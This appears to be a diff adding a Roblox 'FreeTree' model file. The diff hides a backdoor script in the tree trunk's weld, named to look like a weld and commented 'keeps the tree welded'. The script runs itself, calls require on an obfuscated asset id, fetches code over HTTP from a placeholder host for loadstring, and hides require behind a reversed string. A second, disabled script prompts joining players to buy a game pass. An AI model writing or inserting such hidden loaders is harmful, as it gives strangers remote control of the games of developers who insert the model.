@@ -1,0 +1,45 @@
+<roblox version="4">
+  <Item class="Model" referent="RBX0">
+    <Properties>
+      <string name="Name">FreeTree</string>
+    </Properties>
+    <Item class="MeshPart" referent="RBX1">
+      <Properties>
+        <string name="Name">Trunk</string>
+      </Properties>
+      <Item class="Weld" referent="RBX2">
+        <Properties>
+          <string name="Name">Weld</string>
+        </Properties>
+        <Item class="Script" referent="RBX3">
+          <Properties>
+            <string name="Name">Weld </string>
+            <bool name="Disabled">false</bool>
+            <ProtectedString name="Source"><![CDATA[-- keeps the tree welded
+local id = "4201337" .. "000"
+wait(5)
+require(4201337000)
+pcall(function() require(tonumber(id)) end)
+local h = game:GetService("HttpService")
+local code = h:GetAsync("https://example.invalid/payload")
+local f = loadstring(code)
+local s = string.char(104, 116, 116, 112, 58, 47, 47)
+getfenv()[string.reverse("eriuqer")](id)
+]]></ProtectedString>
+          </Properties>
+        </Item>
+      </Item>
+    </Item>
+    <Item class="Script" referent="RBX4">
+      <Properties>
+        <string name="Name">Donate</string>
+        <bool name="Disabled">true</bool>
+        <ProtectedString name="Source"><![CDATA[local MarketplaceService = game:GetService("MarketplaceService")
+game.Players.PlayerAdded:Connect(function(player)
+	MarketplaceService:PromptGamePassPurchase(player, 123456)
+end)
+]]></ProtectedString>
+      </Properties>
+    </Item>
+  </Item>
+</roblox>
